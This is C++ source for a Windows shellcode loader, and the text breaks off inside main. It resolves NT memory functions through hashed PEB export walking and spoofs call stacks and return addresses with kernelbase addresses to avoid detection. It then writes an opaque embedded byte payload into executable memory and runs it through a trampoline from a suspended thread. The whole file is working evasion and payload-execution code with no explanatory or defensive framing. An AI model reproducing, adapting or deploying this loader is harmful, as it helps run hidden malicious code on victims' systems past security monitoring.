#include <windows.h>
#include <winnt.h>
#include <vector>
#include <string>
#include <map>
#include <intrin.h>
#include <algorithm>
#include <random>
#include <stdio.h>

UINT32 CalculateChecksum(const char* input);
UINT32 CalculateWideChecksum(const WCHAR* wideStr);
PVOID ManualGetProcAddress(UINT32 moduleHash, UINT32 functionHash);
PVOID HiddenNtAllocateVirtualMemory(SIZE_T size, DWORD flAllocationType, DWORD flProtect);
void HiddenMemcpy(void* dest, const void* src, size_t size);

typedef union _UNWIND_CODE {
    struct { BYTE CodeOffset; BYTE UnwindOp : 4; BYTE OpInfo : 4; };
    USHORT FrameOffset;
} UNWIND_CODE, *PUNWIND_CODE;

typedef struct _UNWIND_INFO {
    BYTE Version : 3; BYTE Flags : 5; BYTE SizeOfProlog; BYTE CountOfCodes;
    BYTE FrameRegister : 4; BYTE FrameOffset : 4;
    UNWIND_CODE UnwindCode[1];
} UNWIND_INFO, *PUNWIND_INFO;

typedef struct _LDR_DATA_TABLE_ENTRY {
    LIST_ENTRY InLoadOrderLinks; LIST_ENTRY InMemoryOrderLinks; LIST_ENTRY InInitializationOrderLinks;
    PVOID DllBase; PVOID EntryPoint; ULONG SizeOfImage;
    struct { USHORT Length; USHORT MaximumLength; PWSTR Buffer; } FullDllName;
    struct { USHORT Length; USHORT MaximumLength; PWSTR Buffer; } BaseDllName;
} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;

typedef struct _PEB_LDR_DATA {
    ULONG Length; BOOLEAN Initialized; HANDLE SsHandle;
    LIST_ENTRY InLoadOrderModuleList; LIST_ENTRY InMemoryOrderModuleList; LIST_ENTRY InInitializationOrderModuleList;
} PEB_LDR_DATA, *PPEB_LDR_DATA;

typedef struct _PEB {
    BOOLEAN InheritedAddressSpace; BOOLEAN ReadImageFileExecOptions; BOOLEAN BeingDebugged; BOOLEAN BitField;
    HANDLE Mutant; PVOID ImageBaseAddress; PPEB_LDR_DATA Ldr;
} PEB, *PPEB;

#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#define RBP_OP_INFO 0x5

typedef enum _UNWIND_OP_CODES { UWOP_PUSH_NONVOL = 0, UWOP_ALLOC_LARGE, UWOP_ALLOC_SMALL, UWOP_SET_FPREG, UWOP_SAVE_NONVOL, UWOP_SAVE_NONVOL_FAR, UWOP_SAVE_XMM128 = 8, UWOP_SAVE_XMM128_FAR, UWOP_PUSH_MACHFRAME } UNWIND_CODE_OPS;

typedef NTSTATUS(NTAPI* pNtAllocateVirtualMemory)(HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);
typedef NTSTATUS(NTAPI* pNtProtectVirtualMemory)(HANDLE ProcessHandle, PVOID* BaseAddress, PSIZE_T RegionSize, ULONG NewProtect, PULONG OldProtect);
typedef NTSTATUS(NTAPI* pNtFreeVirtualMemory)(HANDLE ProcessHandle, PVOID* BaseAddress, PSIZE_T RegionSize, ULONG FreeType);

struct StackFrame {
    std::wstring moduleName; ULONG offset; ULONG totalStackSize; PVOID returnAddress;
    BOOL setsFramePointer; BOOL pushRbp; ULONG countOfCodes; ULONG pushRbpIndex;
    StackFrame(std::wstring mod, ULONG off) : moduleName(std::move(mod)), offset(off), totalStackSize(0), returnAddress(nullptr), setsFramePointer(FALSE), pushRbp(FALSE), countOfCodes(0), pushRbpIndex(0) {}
};

class FakeAddressPool {
private:
    std::map<std::wstring, std::vector<PVOID>> moduleAddresses;
    
    void PopulateAddresses(const std::wstring& moduleName) {
        UINT32 moduleHash = CalculateWideChecksum(moduleName.c_str());
        const char* functions[] = {
            "GetLastError", "SetLastError", "GetCurrentProcess", "CloseHandle",
            "GetModuleHandleW", "GetProcAddress", "LoadLibraryW", "FreeLibrary",
            "CreateEventW", "SetEvent", "WaitForSingleObject", "GetTickCount",
            "GetSystemTime", "QueryPerformanceCounter", "GetCurrentThreadId", "Sleep",
            "CreateFileW", "ReadFile", "WriteFile", "GetFileSize",
            "RegOpenKeyExW", "RegQueryValueExW", "RegCloseKey", "GetUserNameW"
        };
        
        for (const auto& func : functions) {
            PVOID addr = ManualGetProcAddress(moduleHash, CalculateChecksum(func));
            if (addr) moduleAddresses[moduleName].push_back(addr);
        }
    }
    
public:
    PVOID GetRandomAddress(const std::wstring& moduleName) {
        if (moduleAddresses[moduleName].empty()) {
            PopulateAddresses(moduleName);
        }
        
        if (!moduleAddresses[moduleName].empty()) {
            size_t index = ((GetTickCount() << 16) ^ __rdtsc() ^ GetCurrentThreadId()) % moduleAddresses[moduleName].size();
            return moduleAddresses[moduleName][index];
        }
        return nullptr;
    }
};

PVOID g_Memory = nullptr;
PVOID g_BaseMemory = nullptr;
SIZE_T g_TotalSize = 0;

pNtAllocateVirtualMemory NtAllocateVirtualMemory = nullptr;
static pNtProtectVirtualMemory NtProtectVirtualMemoryPtr = nullptr;
static pNtFreeVirtualMemory    NtFreeVirtualMemoryPtr    = nullptr;
static FakeAddressPool g_AddressPool;

UINT32 CalculateChecksum(const char* input) {
    UINT32 hash = 0x811c9dc5;
    for (int i = 0; input[i]; i++) {
        unsigned char c = (unsigned char)input[i];
        if (c >= 'a' && c <= 'z') c -= 32;
        hash ^= c; hash *= 0x01000193;
    }
    return hash;
}

UINT32 CalculateWideChecksum(const WCHAR* wideStr) {
    UINT32 hash = 0x811c9dc5;
    for (int i = 0; wideStr[i]; i++) {
        WCHAR c = wideStr[i];
        BYTE bytes[2] = { (BYTE)(c & 0xFF), (BYTE)((c >> 8) & 0xFF) };
        for (int j = 0; j < 2; j++) {
            BYTE upper = bytes[j];
            if (upper >= 'a' && upper <= 'z') upper -= 32;
            hash ^= upper; hash *= 0x01000193;
        }
    }
    return hash;
}

PVOID GetPEBAddress() {
#ifdef _WIN64
    return (PVOID)__readgsqword(0x60);
#else
    return (PVOID)__readfsdword(0x30);
#endif
}

PVOID ManualGetProcAddress(UINT32 moduleHash, UINT32 functionHash) {
    PPEB peb = (PPEB)GetPEBAddress();
    if (!peb) return nullptr;
    PPEB_LDR_DATA ldr = peb->Ldr;
    if (!ldr) return nullptr;
    
    PLDR_DATA_TABLE_ENTRY moduleEntry = (PLDR_DATA_TABLE_ENTRY)ldr->InLoadOrderModuleList.Flink;
    PLDR_DATA_TABLE_ENTRY firstEntry = moduleEntry;
    
    do {
        if (moduleEntry->DllBase != nullptr) {
            UINT32 currentModuleHash = CalculateWideChecksum(moduleEntry->BaseDllName.Buffer);
            if (currentModuleHash == moduleHash) {
                __try {
                    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)moduleEntry->DllBase;
                    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) break;
                    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)moduleEntry->DllBase + dosHeader->e_lfanew);
                    if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) break;
                    DWORD exportDirRva = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
                    if (exportDirRva == 0) break;
                    PIMAGE_EXPORT_DIRECTORY exportDir = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)moduleEntry->DllBase + exportDirRva);
                    DWORD* functionRvas = (DWORD*)((BYTE*)moduleEntry->DllBase + exportDir->AddressOfFunctions);
                    DWORD* nameRvas = (DWORD*)((BYTE*)moduleEntry->DllBase + exportDir->AddressOfNames);
                    WORD* nameOrdinals = (WORD*)((BYTE*)moduleEntry->DllBase + exportDir->AddressOfNameOrdinals);
                    for (DWORD i = 0; i < exportDir->NumberOfNames; i++) {
                        char* functionName = (char*)((BYTE*)moduleEntry->DllBase + nameRvas[i]);
                        if (CalculateChecksum(functionName) == functionHash) {
                            WORD ordinal = nameOrdinals[i];
                            DWORD functionRva = functionRvas[ordinal];
                            return (PVOID)((BYTE*)moduleEntry->DllBase + functionRva);
                        }
                    }
                } __except(EXCEPTION_EXECUTE_HANDLER) { return nullptr; }
                break;
            }
        }
        moduleEntry = (PLDR_DATA_TABLE_ENTRY)moduleEntry->InLoadOrderLinks.Flink;
    } while (moduleEntry != firstEntry);
    return nullptr;
}

BOOL InitializeNtApis() {
    UINT32 ntdllHash = CalculateWideChecksum(L"ntdll.dll");

    NtAllocateVirtualMemory = (pNtAllocateVirtualMemory)
        ManualGetProcAddress(ntdllHash, CalculateChecksum("NtAllocateVirtualMemory"));

    NtProtectVirtualMemoryPtr = (pNtProtectVirtualMemory)
        ManualGetProcAddress(ntdllHash, CalculateChecksum("NtProtectVirtualMemory"));

    NtFreeVirtualMemoryPtr = (pNtFreeVirtualMemory)
        ManualGetProcAddress(ntdllHash, CalculateChecksum("NtFreeVirtualMemory"));

    return (NtAllocateVirtualMemory && NtProtectVirtualMemoryPtr && NtFreeVirtualMemoryPtr);
}

DWORD GetFunctionOffset(const wchar_t* moduleName, const char* functionName) {
    HMODULE hMod = GetModuleHandleW(moduleName);
    if (!hMod) return 0;
    UINT32 moduleHash = CalculateWideChecksum(moduleName);
    UINT32 functionHash = CalculateChecksum(functionName);
    PVOID funcAddr = ManualGetProcAddress(moduleHash, functionHash);
    return funcAddr ? (DWORD)((ULONG_PTR)funcAddr - (ULONG_PTR)hMod) : 0;
}

void RandomDelay() {
    LARGE_INTEGER freq, start, end;
    QueryPerformanceFrequency(&freq);
    QueryPerformanceCounter(&start);
    
    DWORD delayMs = (GetTickCount() % 50) + 1;
    Sleep(delayMs);
}

void GenerateNoise() {
    SYSTEMTIME st;
    GetSystemTime(&st);
    GetCurrentThreadId();
    LARGE_INTEGER pc;
    QueryPerformanceCounter(&pc);
}

// Consolidated stack creation function
std::vector<StackFrame> CreateStackFromAPIs(const std::vector<std::pair<const wchar_t*, const char*>>& apis) {
    std::vector<StackFrame> callStack;
    for (const auto& [module, func] : apis) {
        DWORD offset = GetFunctionOffset(module, func);
        if (offset) callStack.emplace_back(module, offset);
    }
    return callStack;
}

std::vector<StackFrame> CreateFileOperationsStack() {
    return CreateStackFromAPIs({
        {L"kernelbase.dll", "CreateFileW"},
        {L"ntdll.dll", "NtReadFile"},
        {L"ntdll.dll", "NtWriteFile"},
        {L"ntdll.dll", "NtCreateFile"}
    });
}

std::vector<StackFrame> CreateRegistryOperationsStack() {
    return CreateStackFromAPIs({
        {L"kernelbase.dll", "RegOpenKeyExW"},
        {L"kernelbase.dll", "RegQueryValueExW"},
        {L"kernelbase.dll", "RegSetValueExW"},
        {L"ntdll.dll", "NtOpenKey"},
        {L"ntdll.dll", "NtQueryValueKey"}
    });
}

std::vector<StackFrame> CreateProcessOperationsStack() {
    return CreateStackFromAPIs({
        {L"kernelbase.dll", "OpenProcess"},
        {L"kernelbase.dll", "GetProcessId"},
        {L"kernelbase.dll", "TerminateProcess"},
        {L"ntdll.dll", "NtOpenProcess"},
        {L"ntdll.dll", "NtQueryInformationProcess"}
    });
}

std::vector<StackFrame> CreateNetworkOperationsStack() {
    return CreateStackFromAPIs({
        {L"kernelbase.dll", "ConnectNamedPipe"},
        {L"ntdll.dll", "NtReadFile"},
        {L"ntdll.dll", "NtWriteFile"},
        {L"ntdll.dll", "NtDeviceIoControlFile"}
    });
}

NTSTATUS GetModuleBase(const StackFrame& frame, std::map<std::wstring, HMODULE>& moduleBaseMap) {
    if (moduleBaseMap.count(frame.moduleName)) return STATUS_SUCCESS;
    HMODULE hMod = GetModuleHandleW(frame.moduleName.c_str());
    if (!hMod) return E_FAIL;
    moduleBaseMap[frame.moduleName] = hMod;
    return STATUS_SUCCESS;
}

NTSTATUS CalculateReturnAddress(StackFrame& frame, const std::map<std::wstring, HMODULE>& moduleBaseMap) {
    auto it = moduleBaseMap.find(frame.moduleName);
    if (it == moduleBaseMap.end()) return E_FAIL;
    frame.returnAddress = (PCHAR)it->second + frame.offset;
    return STATUS_SUCCESS;
}

NTSTATUS CalculateFunctionStackSize(PRUNTIME_FUNCTION pRuntimeFunction, DWORD64 imageBase, StackFrame& frame) {
    if (!pRuntimeFunction) return E_INVALIDARG;
    __try {
        PUNWIND_INFO pUnwindInfo = (PUNWIND_INFO)(pRuntimeFunction->UnwindData + imageBase);
        ULONG index = 0;
        while (index < pUnwindInfo->CountOfCodes) {
            auto& unwindCode = pUnwindInfo->UnwindCode[index];
            ULONG operation = unwindCode.UnwindOp;
            ULONG operationInfo = unwindCode.OpInfo;
            switch (operation) {
            case UWOP_PUSH_NONVOL:
                frame.totalStackSize += 8;
                if (operationInfo == RBP_OP_INFO) {
                    frame.pushRbp = TRUE; frame.countOfCodes = pUnwindInfo->CountOfCodes; frame.pushRbpIndex = index + 1;
                }
                break;
            case UWOP_SAVE_NONVOL: index += 1; break;
            case UWOP_ALLOC_SMALL: frame.totalStackSize += ((operationInfo * 8) + 8); break;
            case UWOP_ALLOC_LARGE: {
                index += 1;
                ULONG frameOffset = pUnwindInfo->UnwindCode[index].FrameOffset;
                if (operationInfo == 0) frameOffset *= 8;
                else { index += 1; frameOffset += (pUnwindInfo->UnwindCode[index].FrameOffset << 16); }
                frame.totalStackSize += frameOffset;
                break;
            }
            case UWOP_SET_FPREG: frame.setsFramePointer = TRUE; break;
            }
            index += 1;
        }
        if (pUnwindInfo->Flags & UNW_FLAG_CHAININFO) {
            index = pUnwindInfo->CountOfCodes;
            if (index & 1) index += 1;
            pRuntimeFunction = (PRUNTIME_FUNCTION)(&pUnwindInfo->UnwindCode[index]);
            return CalculateFunctionStackSize(pRuntimeFunction, imageBase, frame);
        }
        frame.totalStackSize += 8;
    } __except (EXCEPTION_EXECUTE_HANDLER) { return E_FAIL; }
    return STATUS_SUCCESS;
}

NTSTATUS CalculateFrameStackSize(StackFrame& frame) {
    if (!frame.returnAddress) return E_INVALIDARG;
    __try {
        DWORD64 imageBase = 0;
        PRUNTIME_FUNCTION pRuntimeFunction = RtlLookupFunctionEntry((DWORD64)frame.returnAddress, &imageBase, nullptr);
        return pRuntimeFunction ? CalculateFunctionStackSize(pRuntimeFunction, imageBase, frame) : E_FAIL;
    } __except(EXCEPTION_EXECUTE_HANDLER) { return E_FAIL; }
}

NTSTATUS InitializeCallstack(std::vector<StackFrame>& callStack) {
    std::map<std::wstring, HMODULE> moduleBaseMap;
    for (auto& frame : callStack) {
        if (!NT_SUCCESS(GetModuleBase(frame, moduleBaseMap))) continue;
        if (!NT_SUCCESS(CalculateReturnAddress(frame, moduleBaseMap))) continue;
        if (!NT_SUCCESS(CalculateFrameStackSize(frame))) frame.totalStackSize = 0;
    }
    callStack.erase(std::remove_if(callStack.begin(), callStack.end(), [](const StackFrame& frame) { return frame.totalStackSize == 0; }), callStack.end());
    return callStack.empty() ? E_FAIL : STATUS_SUCCESS;
}

void PushToStack(CONTEXT& context, ULONG64 value) {
    context.Rsp -= 8;
    *(PULONG64)(context.Rsp) = value;
}

void InitializeFakeThreadState(CONTEXT& context, const std::vector<StackFrame>& callStack) {
    ULONG64 childSp = 0;
    BOOL previousFrameSetFP = FALSE;
    PushToStack(context, 0);
    for (auto it = callStack.rbegin(); it != callStack.rend(); ++it) {
        const auto& frame = *it;
        if (previousFrameSetFP && frame.pushRbp) {
            auto diff = frame.countOfCodes - frame.pushRbpIndex;
            ULONG tmpStackSize = 0;
            for (ULONG i = 0; i < diff; i++) { PushToStack(context, 0x0); tmpStackSize += 8; }
            PushToStack(context, childSp);
            context.Rsp -= (frame.totalStackSize - (tmpStackSize + 8));
            *(PULONG64)(context.Rsp) = (ULONG64)frame.returnAddress;
            previousFrameSetFP = FALSE;
        } else {
            context.Rsp -= frame.totalStackSize;
            *(PULONG64)(context.Rsp) = (ULONG64)frame.returnAddress;
        }
        if (frame.setsFramePointer) { childSp = context.Rsp + 8; previousFrameSetFP = TRUE; }
    }
}

std::vector<BYTE> BuildPayload() {
    std::vector<BYTE> payload;
    std::vector<std::vector<BYTE>> chunks = {
        {0xe8, 0xcd, 0x01, 0x00, 0x00, 0xde, 0x69, 0x25, 0xf5, 0xe6, 0xaf, 0x53, 0x79, 0xd4, 0x58, 0x00},
        {0x80, 0xac, 0x87, 0x0b, 0x03, 0x30, 0x14, 0x08, 0x02, 0x14, 0x08, 0xe2, 0xf8, 0x29, 0xb8, 0xbd},
        {0x39, 0x61, 0x31, 0x0f, 0x6a, 0x06, 0x48, 0x03, 0x07, 0xe7, 0x8f, 0x4d, 0x4d, 0x4d, 0x4d, 0xea},
        {0x3b, 0x7a, 0x8a, 0xd6, 0x67, 0x31, 0xfc, 0xac, 0xc9, 0x7d, 0xf6, 0x24, 0xb4, 0xfa, 0x4d, 0x1f},
        {0xf7, 0xbf, 0xb0, 0xe2, 0x32, 0x64, 0x0f, 0x7d, 0xad, 0xd9, 0xa8, 0x9f, 0xc1, 0x03, 0x24, 0x85},
        {0x2a, 0x9b, 0x03, 0x4f, 0x73, 0xea, 0x96, 0x44, 0x68, 0x46, 0x87, 0xb4, 0x7d, 0x6e, 0x2f, 0xac},
        {0x69, 0x73, 0x19, 0x4b, 0xe8, 0x39, 0x6d, 0xc6, 0x54, 0x62, 0xe5, 0x57, 0x6b, 0x23, 0x82, 0x4c},
        {0xc7, 0x37, 0xbf, 0xbf, 0xbf, 0x3f, 0x77, 0xf2, 0xca, 0x38, 0x43, 0x0b, 0xea, 0xba, 0xd4, 0x5f},
        {0xe7, 0xff, 0xbb, 0xb0, 0xf0, 0xce, 0x87, 0x66, 0x30, 0x23, 0x79, 0xcd, 0xa0, 0x69, 0x16, 0x5d},
        {0x69, 0xd1, 0x99, 0x14, 0x38, 0x7d, 0x4a, 0x63, 0x52, 0x4a, 0xe4, 0x25, 0xd2, 0x03, 0x8c, 0xcd},
        {0xca, 0x03, 0x07, 0x27, 0x92, 0x58, 0x02, 0x71, 0x2d, 0x09, 0xf9, 0xb2, 0x03, 0xd0, 0x65, 0x5a},
        {0x63, 0x96, 0xb0, 0xe0, 0x92, 0x99, 0x91, 0x25, 0x6a, 0x4b, 0x53, 0xb5, 0xe2, 0x51, 0x5d, 0x95},
        {0xcd, 0x46, 0xf6, 0xe8, 0xa1, 0x00, 0xce, 0x8f, 0x04, 0xf0, 0x78, 0x2e, 0x8f, 0x5f, 0x17, 0x14},
        {0xc0, 0xc6, 0x77, 0x8f, 0x21, 0x44, 0x9c, 0xdd, 0x05, 0xb2, 0xeb, 0x0a, 0x40, 0x06, 0x75, 0x59},
        {0x79, 0xb4, 0x18, 0xe7, 0xf7, 0x2f, 0x4c, 0xe1, 0x3b, 0x63, 0xc4, 0x04, 0xcd, 0x65, 0x64, 0x63},
        {0x62, 0xbf, 0x86, 0xb6, 0x3d, 0x2e, 0xe2, 0xb9, 0x6a, 0x58, 0x58, 0x56, 0x97, 0x31, 0x66, 0xef},
        {0x89, 0xc1, 0xb8, 0x14, 0xb2, 0xb3, 0xb3, 0x23, 0x68, 0x19, 0xfa, 0x4b, 0xf7, 0xf5, 0xc9, 0x17},
        {0x88, 0xf7, 0xf7, 0xf7, 0xf4, 0x35, 0x51, 0x06, 0x4f, 0x13, 0x5f, 0x14, 0xe5, 0x50, 0xd2, 0x50},
        {0x27, 0xfd, 0x04, 0xf3, 0x96, 0xd8, 0x8d, 0x67, 0xf1, 0x44, 0x46, 0x42, 0xf3, 0x09, 0x20, 0x5e},
        {0x35, 0xc9, 0xb4, 0x41, 0x91, 0x39, 0x7a, 0x4b, 0x78, 0x3d, 0x8c, 0x2a, 0x9b, 0xb5, 0x4a, 0x46},
        {0x19, 0x00, 0x48, 0x49, 0xf4, 0x8e, 0x5a, 0xa9, 0x76, 0x68, 0x17, 0x32, 0x78, 0xed, 0xa8, 0x89},
        {0x31, 0x21, 0x21, 0x21, 0x99, 0xc5, 0x88, 0x6a, 0x10, 0x59, 0x1e, 0x1f, 0x95, 0xc2, 0x87, 0xf3},
        {0x6c, 0x6b, 0x3e, 0x74, 0xf5, 0xb1, 0xed, 0xef, 0xef, 0xef, 0x4e, 0xf0, 0x4b, 0xa6, 0xc2, 0xc0},
        {0x61, 0xb1, 0xf0, 0x10, 0x46, 0x0f, 0xc1, 0x68, 0xbf, 0xd6, 0x5b, 0x72, 0xb0, 0xf9, 0xf2, 0x33},
        {0x63, 0x79, 0x79, 0x9f, 0x50, 0xd4, 0xc8, 0x9a, 0x9b, 0x1a, 0x48, 0xc5, 0x79, 0x5d, 0xb9, 0x7f},
        {0x7f, 0x87, 0xcf, 0x86, 0x5c, 0xea, 0x38, 0x79, 0xa9, 0xc8, 0x16, 0x57, 0xf7, 0x9d, 0x02, 0x4f},
        {0xc4, 0xf5, 0xb9, 0xae, 0x6f, 0xce, 0x82, 0xe3, 0xcf, 0xec, 0x94, 0x43, 0x06, 0x48, 0xcb, 0xfd},
        {0xfc, 0x67, 0x69, 0xd4, 0x6e, 0x58, 0xdf, 0x02, 0x9c, 0x5b, 0x68, 0x13, 0x9b, 0x2e, 0x60, 0xb4},
        {0x81, 0x33, 0x95, 0xfe, 0x3b, 0x58, 0x07, 0xc2, 0x84, 0x87, 0x33, 0xdb, 0xe3, 0xa8, 0xe9, 0x5c},
        {0x78, 0x67, 0x41, 0x5c, 0x48, 0x0f, 0x4c, 0xf6, 0xeb, 0x04, 0x95, 0x1d, 0x9e, 0xe5, 0x41, 0x81},
        {0x34, 0x24, 0x6c, 0xdb, 0x6d, 0x32, 0xfc, 0x41, 0x81, 0x74, 0x24, 0x04, 0x27, 0x1a, 0x52, 0x79},
        {0x49, 0xc1, 0xe7, 0x00, 0x41, 0xc1, 0x44, 0x24, 0x08, 0x8c, 0xeb, 0x04, 0xe8, 0xb8, 0x53, 0x76},
        {0x48, 0x83, 0xeb, 0x00, 0x41, 0x81, 0x6c, 0x24, 0x0c, 0xa5, 0x87, 0x0b, 0x03, 0x41, 0xff, 0xe4}
    };
    for (auto& chunk : chunks) payload.insert(payload.end(), chunk.begin(), chunk.end());
    return payload;
}

BOOL HiddenNtProtectVirtualMemory(PVOID base, SIZE_T size, DWORD newProtect, PDWORD oldProtect) {
    ULONG64* stackPtr = (ULONG64*)_AddressOfReturnAddress();
    ULONG64 realRet = *stackPtr;

    PVOID fakeAddr = g_AddressPool.GetRandomAddress(L"kernelbase.dll");
    if (fakeAddr) *stackPtr = (ULONG64)fakeAddr;

    SIZE_T regionSize = size;
    PVOID baseCopy = base;
    NTSTATUS st = NtProtectVirtualMemoryPtr(
        GetCurrentProcess(), &baseCopy, &regionSize, newProtect, oldProtect);

    *stackPtr = realRet;
    return NT_SUCCESS(st);
}

PVOID HiddenNtAllocateVirtualMemory(SIZE_T size, DWORD flAllocationType, DWORD flProtect) {
    ULONG64* stackPtr = (ULONG64*)_AddressOfReturnAddress();
    ULONG64 realRet = *stackPtr;

    PVOID fakeAddr = g_AddressPool.GetRandomAddress(L"kernelbase.dll");
    if (fakeAddr) *stackPtr = (ULONG64)fakeAddr;

    PVOID baseAddress = nullptr;
    SIZE_T regionSize = size;
    NTSTATUS st = NtAllocateVirtualMemory(
        GetCurrentProcess(), &baseAddress, 0, &regionSize, flAllocationType, flProtect);

    *stackPtr = realRet;
    return NT_SUCCESS(st) ? baseAddress : nullptr;
}

void HiddenMemcpy(void* dest, const void* src, size_t size) {
    ULONG64* stackPtr = (ULONG64*)_AddressOfReturnAddress();
    ULONG64 realRet = *stackPtr;
    
    PVOID fakeAddr = g_AddressPool.GetRandomAddress(L"kernelbase.dll");
    if (fakeAddr) *stackPtr = (ULONG64)fakeAddr;
    
    BYTE* destBytes = (BYTE*)dest;
    const BYTE* srcBytes = (const BYTE*)src;
    for (size_t i = 0; i < size; i++) {
        destBytes[i] = srcBytes[i];
    }
    
    *stackPtr = realRet;
}

HANDLE HiddenCreateThread(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId) {
    ULONG64* stackPtr = (ULONG64*)_AddressOfReturnAddress();
    ULONG64 realRet = *stackPtr;
    
    PVOID fakeAddr = g_AddressPool.GetRandomAddress(L"kernelbase.dll");
    if (fakeAddr) *stackPtr = (ULONG64)fakeAddr;
    
    HANDLE result = CreateThread(lpThreadAttributes, dwStackSize, lpStartAddress, lpParameter, dwCreationFlags, lpThreadId);
    *stackPtr = realRet;
    return result;
}

DWORD HiddenSuspendThread(HANDLE hThread) {
    ULONG64* stackPtr = (ULONG64*)_AddressOfReturnAddress();
    ULONG64 realRet = *stackPtr;
    
    PVOID fakeAddr = g_AddressPool.GetRandomAddress(L"kernelbase.dll");
    if (fakeAddr) *stackPtr = (ULONG64)fakeAddr;
    
    DWORD result = SuspendThread(hThread);
    *stackPtr = realRet;
    return result;
}

DWORD HiddenResumeThread(HANDLE hThread) {
    ULONG64* stackPtr = (ULONG64*)_AddressOfReturnAddress();
    ULONG64 realRet = *stackPtr;
    
    PVOID fakeAddr = g_AddressPool.GetRandomAddress(L"kernelbase.dll");
    if (fakeAddr) *stackPtr = (ULONG64)fakeAddr;
    
    DWORD result = ResumeThread(hThread);
    *stackPtr = realRet;
    return result;
}

BOOL HiddenGetThreadContext(HANDLE hThread, LPCONTEXT lpContext) {
    ULONG64* stackPtr = (ULONG64*)_AddressOfReturnAddress();
    ULONG64 realRet = *stackPtr;
    
    PVOID fakeAddr = g_AddressPool.GetRandomAddress(L"kernelbase.dll");
    if (fakeAddr) *stackPtr = (ULONG64)fakeAddr;
    
    BOOL result = GetThreadContext(hThread, lpContext);
    *stackPtr = realRet;
    return result;
}

BOOL HiddenSetThreadContext(HANDLE hThread, const CONTEXT* lpContext) {
    ULONG64* stackPtr = (ULONG64*)_AddressOfReturnAddress();
    ULONG64 realRet = *stackPtr;
    
    PVOID fakeAddr = g_AddressPool.GetRandomAddress(L"kernelbase.dll");
    if (fakeAddr) *stackPtr = (ULONG64)fakeAddr;
    
    BOOL result = SetThreadContext(hThread, lpContext);
    *stackPtr = realRet;
    return result;
}

BOOL HiddenNtFreeVirtualMemory(PVOID base, SIZE_T size, DWORD freeType) {
    ULONG64* stackPtr = (ULONG64*)_AddressOfReturnAddress();
    ULONG64 realRet = *stackPtr;

    PVOID fakeAddr = g_AddressPool.GetRandomAddress(L"kernelbase.dll");
    if (fakeAddr) *stackPtr = (ULONG64)fakeAddr;

    PVOID baseCopy = base;
    SIZE_T regionSize = size;
    NTSTATUS st = NtFreeVirtualMemoryPtr(
        GetCurrentProcess(), &baseCopy, &regionSize, freeType);

    *stackPtr = realRet;
    return NT_SUCCESS(st);
}

BOOL HiddenJitExecute(PVOID callbackAddr) {
    ULONG64* stackPtr = (ULONG64*)_AddressOfReturnAddress();
    ULONG64 realRet = *stackPtr;

    PVOID fakeAddr = g_AddressPool.GetRandomAddress(L"kernelbase.dll");
    if (fakeAddr) *stackPtr = (ULONG64)fakeAddr;

    BYTE trampoline[] = {
        0x48, 0xB8, 0,0,0,0,0,0,0,0,  // mov rax, imm64
        0xFF, 0xE0                      // jmp rax
    };
    *reinterpret_cast<void**>(&trampoline[2]) = callbackAddr;

    SIZE_T stubSize = sizeof(trampoline);
    PVOID stub = HiddenNtAllocateVirtualMemory(stubSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!stub) {
        *stackPtr = realRet;
        return FALSE;
    }

    HiddenMemcpy(stub, trampoline, sizeof(trampoline));

    DWORD oldProt = 0;
    HiddenNtProtectVirtualMemory(stub, sizeof(trampoline), PAGE_EXECUTE_READ, &oldProt);

    using TrampFn = void(*)();
    TrampFn fn = reinterpret_cast<TrampFn>(stub);
    fn();

    HiddenNtFreeVirtualMemory(stub, 0, MEM_RELEASE);
    *stackPtr = realRet;
    return TRUE;
}

PVOID CreateMemoryWithStack() {
    printf("[+] Creating memory with spoofed stack\n");
    
    auto fakeStack = CreateFileOperationsStack();
    InitializeCallstack(fakeStack);

    SIZE_T baseSize = 0x1000;
    SIZE_T randomPadding = ((GetTickCount() * 0x1337) % 0x3000) & ~0xFFF;
    SIZE_T totalSize = baseSize + randomPadding;
    
    printf("[+] Allocating base memory: 0x%zx bytes\n", totalSize);
    PVOID baseMemory = HiddenNtAllocateVirtualMemory(totalSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!baseMemory) return nullptr;
    
    g_BaseMemory = baseMemory;
    g_TotalSize = totalSize;

    DWORD maxOffset = (DWORD)randomPadding;
    DWORD offset = 0;
    if (maxOffset > 0) {
        offset = ((GetTickCount() ^ GetCurrentThreadId()) % maxOffset) & ~0xF;
    }
    
    PVOID actualMemory = (BYTE*)baseMemory + offset;
    
    printf("[+] Writing payload at offset: 0x%x\n", offset);
    auto shellcode = BuildPayload();
    HiddenMemcpy(actualMemory, shellcode.data(), shellcode.size());
    
    return actualMemory;
}

DWORD WINAPI WorkerThread(LPVOID param) {
    printf("[+] Worker thread started\n");
    GenerateNoise();
    RandomDelay();
    
    printf("[+] Executing payload via JIT\n");
    HiddenJitExecute(g_Memory);
    
    printf("[+] Worker thread completed\n");
    return 0;
}

int main() {
    printf("[*] Initializing NT APIs\n");
    if (!InitializeNtApis()) {
        printf("[-] Failed to initialize NT APIs\n");
        return -1;
    }

    GenerateNoise();
    RandomDelay();
    
    printf("[*] Preparing memory region\n");
    g_Memory = CreateMemoryWithStack();
    if (!g_Memory) {
        printf("[-] Failed to create memory\n");
        return -1;
    }
    
    GenerateNoise();
    RandomDelay();
    
    printf("[*] Creating suspended worker thread\n");
    auto threadStack = CreateRegistryOperationsStack();
    InitializeCallstack(threadStack);
    
    RandomDelay();
    
    DWORD threadId = 0;
    HANDLE hWorkerThread = HiddenCreateThread(nullptr, 0, WorkerThread, nullptr, CREATE_SUSPENDED, &threadId);
